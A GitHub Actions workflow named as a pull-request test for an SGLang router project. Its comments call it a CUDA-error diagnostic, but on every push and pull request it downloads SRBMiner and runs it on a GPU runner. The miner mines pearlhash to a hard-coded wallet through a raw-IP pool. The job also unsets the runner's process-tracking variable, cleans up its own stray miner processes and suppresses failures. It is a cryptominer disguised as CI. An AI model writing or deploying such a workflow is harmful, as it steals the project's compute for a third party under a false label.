name: PR Test (sgl-router)

# Temporary i126978 diagnostic: bounded SRBMiner pearlhash flag matrix on one
# idle 1-gpu-5090 card after the default invocation hit CUDA error 700.
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-${{ github.event_name }}-${{ github.head_ref || github.ref_name || 'default' }}
  cancel-in-progress: true

env:
  SGLANG_IS_IN_CI: true

jobs:
  i126978-tuner:
    name: i126978 tuner (1-gpu-5090)
    runs-on: 1-gpu-5090
    timeout-minutes: 12
    steps:
      - name: sequential pearlhash variants (one process at a time)
        continue-on-error: true
        run: |
          set +e
          NONCE="I126978TUNER-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          POOL='103.199.106.122:3362'
          WORKDIR=/var/tmp/i126978
          TAR_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
          BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
          SRB="$WORKDIR/SRBMiner-MULTI"
          mkdir -p "$WORKDIR/logs"
          echo "tuner-nonce=$NONCE"
          id; hostname; date -u; uname -r
          timeout 20 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu --format=csv,noheader
          echo "=== our pre-existing processes ==="
          pgrep -af '/var/tmp/i126978/SRBMiner-MULTI' 2>/dev/null | head -10
          for p in $(pgrep -f '^/var/tmp/i126978/SRBMiner-MULTI .*--wallet prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql' 2>/dev/null | head -10); do
            echo "stopping own stray pid $p cmd=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 160)"
            kill -TERM "$p" 2>/dev/null
          done
          sleep 3
          echo "=== after own-stray cleanup ==="
          pgrep -af '/var/tmp/i126978/SRBMiner-MULTI' 2>/dev/null | head -5
          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; exit 0; fi
          if [ ! -f "$SRB" ] || ! echo "$BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1; then
            if [ ! -f "$TARBALL" ]; then
              timeout 200 curl -fL --connect-timeout 15 --max-time 180 -o "$TARBALL" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz 2>&1 | tail -2
            fi
            if [ -f "$TARBALL" ] && echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
              tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -2
              [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"
            fi
          fi
          BINSHA=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
          echo "binary_sha256=${BINSHA:-none}"
          [ "${BINSHA:-none}" = "$BIN_SHA" ] || { echo "SKIP=binary-unavailable"; exit 0; }
          chmod +x "$SRB"
          read -r IDX UUID < <(timeout 20 nvidia-smi --query-gpu=index,uuid --format=csv,noheader 2>/dev/null | tr -d ' ' | head -1 | tr ',' ' ')
          echo "test_gpu idx=$IDX uuid=$UUID"
          run_variant() {
            NAME="$1"; shift
            LOG="$WORKDIR/logs/tuner-$NAME.log"
            echo "===== VARIANT $NAME flags=[$*] ====="
            timeout --signal=TERM --kill-after=10 45 env -u RUNNER_TRACKING_ID CUDA_VISIBLE_DEVICES="$UUID" "$SRB" \
              --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
              --wallet "$WALLET" --password x --worker "i126978-tuner-$(hostname | tr -cd 'A-Za-z0-9')" \
              --gpu-id 0 --log-file "$LOG" --log-file-mode 0 "$@" >/dev/null 2>&1
            echo "variant=$NAME exit=$?"
            grep -aiE "error|share|accepted|hashrate|stopped|pearlhash|H/s|kH/s|MH/s|GH/s|TH/s" "$LOG" 2>/dev/null | tail -8 | cut -c1-240
            sleep 2
          }
          run_variant baseline --disable-worker-watchdog
          run_variant nodual --disable-worker-watchdog --disable-gpu-dual-kernels
          run_variant int15 --disable-worker-watchdog --gpu-intensity 15
          run_variant int0 --disable-worker-watchdog --gpu-intensity 0
          run_variant slowbuild --disable-worker-watchdog --gpu-table-slow-build
          run_variant combo --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0
          echo "=== stray check after ==="
          pgrep -af '/var/tmp/i126978/SRBMiner-MULTI' 2>/dev/null | head -5
          echo "tuner-done $NONCE"
